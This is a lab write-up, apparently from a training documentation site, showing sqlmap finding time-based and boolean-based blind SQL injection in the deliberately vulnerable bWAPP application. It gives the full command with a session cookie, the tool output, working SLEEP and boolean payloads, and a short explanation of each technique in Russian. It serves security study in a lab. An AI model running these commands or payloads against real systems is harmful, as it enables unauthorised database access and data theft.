---
title: SQL Injection - Blind - Time-Based
sidebar_position: 1
---

# SQL Injection - Blind - Time-Based

**(low)**


Запрос в sqlmap
```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.42.132/bWAPP/sqli_15.php --cookie="PHPSESSID=c1e4694294baea16261ef0e4052e5bbd; security_level=0" --data="title=Iron+Man&action=search" -p title --dbs

        ___
       __H__
 ___ ___["]_____ ___ ___ {1.9.10#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_| https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. **Developers** assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:06:32 /2025-11-13/

[02:06:32] [INFO] testing connection to the target URL

[02:06:32] [WARNING] potential CAPTCHA protection mechanism detected

[02:06:32] [INFO] checking if the target is protected by some kind of WAF/IPS

[02:06:32] [INFO] testing if the target URL content is stable

[02:06:33] [INFO] target URL content is stable

[02:06:33] [WARNING] heuristic (basic) test shows that POST parameter 'title' might not be injectable

[02:06:33] [INFO] testing for SQL injection on POST parameter 'title'

[02:06:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[02:06:33] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'

[02:06:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'

[02:06:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'

[02:06:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'

[02:06:33] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'

[02:06:33] [INFO] testing 'Generic inline queries'

[02:06:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'

[02:06:33] [WARNING] time-based comparison requires larger statistical model, please wait. (done)

[02:06:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'

[02:06:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'

[02:06:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

[02:06:44] [INFO] POST parameter 'title' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable

it looks like the back-end DBMS is 'MySQL'. **Do** you want to skip test payloads specific for other **DBMSes**? [Y/n] n

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y

[02:07:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'

[02:07:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

[02:07:29] [INFO] checking if the injection point on POST parameter 'title' is a false positive

POST parameter 'title' is vulnerable. **Do** you want to keep testing the others (if any)? [y/N] y

sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:

---

**Parameter**: title (POST)

**Type**: time-based blind

**Title**: **MySQL** >= 5.0.12 AND time-based blind (query SLEEP)

**Payload**: title=**Iron** **Man**' AND (SELECT 9213 FROM (SELECT(SLEEP(5)))UVMe) AND 'ywEJ'='ywEJ&action=search

---

[02:08:32] [INFO] the back-end DBMS is **MySQL**

[02:08:32] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions

web server operating system: **Linux** **Ubuntu** 8.04 (**Hardy** **Heron**)

web application technology: PHP 5.2.4, **Apache** 2.2.8

back-end DBMS: **MySQL** >= 5.0.12

[02:08:32] [INFO] fetching database names

[02:08:32] [INFO] fetching number of databases

[02:08:32] [INFO] retrieved:

do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y

4

[02:08:57] [INFO] retrieved: y

[02:09:07] [INFO] adjusting time delay to 1 second due to good response times

information_schema

[02:10:05] [INFO] retrieved: bWAPP

[02:10:24] [INFO] retrieved: drupageddon

[02:11:01] [INFO] retrieved: mysql

available databases [4]:

[*] bWAPP

[*] drupageddon

[*] information_schema

[*] mysql

[02:11:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.42.132'

[*] ending @ 02:11:18 /2025-11-13/

┌──(kali㉿kali)-[~]
└─$
```
**Logfile**
```bash
sqlmap identified the following injection point(s) with a total of 2252 HTTP(s) requests:

---

**Parameter**: title (POST)

**Type**: boolean-based blind

**Title**: AND boolean-based blind - WHERE or HAVING clause

**Payload**: title=**Iron** **Man**' AND 9841=9841 AND '**ZHzy**'='**ZHzy**&action=search

**Type**: time-based blind

**Title**: **MySQL** >= 5.0.12 AND time-based blind (query SLEEP)

**Payload**: title=**Iron** **Man**' AND (SELECT 2849 FROM (SELECT(SLEEP(5)))VlHP) AND 'kfFV'='kfFV&action=search

---

web server operating system: **Linux** **Ubuntu** 8.04 (**Hardy** **Heron**)

web application technology: **Apache** 2.2.8, PHP 5.2.4

back-end DBMS: **MySQL** >= 5.0.12

available databases [4]:

[*] bWAPP
[*] drupageddon
[*] information_schema
[*] mysql

sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:

---

**Parameter**: title (POST)

**Type**: time-based blind

**Title**: **MySQL** >= 5.0.12 AND time-based blind (query SLEEP)

**Payload**: title=**Iron** **Man**' AND (SELECT 9213 FROM (SELECT(SLEEP(5)))UVMe) AND 'ywEJ'='ywEJ&action=search

---

web server operating system: **Linux** **Ubuntu** 8.04 (**Hardy** **Heron**)

web application technology: PHP 5.2.4, **Apache** 2.2.8

back-end DBMS: **MySQL** >= 5.0.12

available databases [4]:

[*] bWAPP
[*] drupageddon
[*] information_schema
[*] mysql
```
**Boolean-based:** Приложение меняет свой ответ в зависимости от того, истинно условие в запросе или ложно. Это позволяет извлекать данные, анализируя изменения на странице.

**Time-based:** База данных успешно выполнила команду SLEEP(5), из-за чего ответ сервера пришел с задержкой. Это подтверждает возможность исполнения произвольного SQL-кода.

![](images/SQL_Injection_-_Blind_-_Time-Based_img_1.png)